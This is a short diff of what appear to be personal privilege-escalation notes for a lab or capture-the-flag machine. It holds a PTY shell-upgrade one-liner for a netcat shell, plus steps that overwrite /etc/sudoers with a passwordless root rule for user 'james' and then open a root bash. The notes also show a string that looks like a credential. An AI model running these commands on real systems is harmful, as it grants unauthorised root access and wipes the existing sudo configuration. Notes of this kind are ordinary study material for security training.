@@ -162,10 +162,18 @@ Ee24zIK4cDhJHL4H
 
 12.Other Methods:
 
-add yourself to sudoers:
-echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
-
 from PHP Shell (Netcat): python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+add yourself to sudoers:
+1. echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+2. sudo -l
+	User james may run the following commands on blaze:
+   	 (root) NOPASSWD: ALL
+
+3. sudo /bin/bash
+4. whoami
+
 
 --------------------------------------------------------------------------------------------------
 		LinPEASS
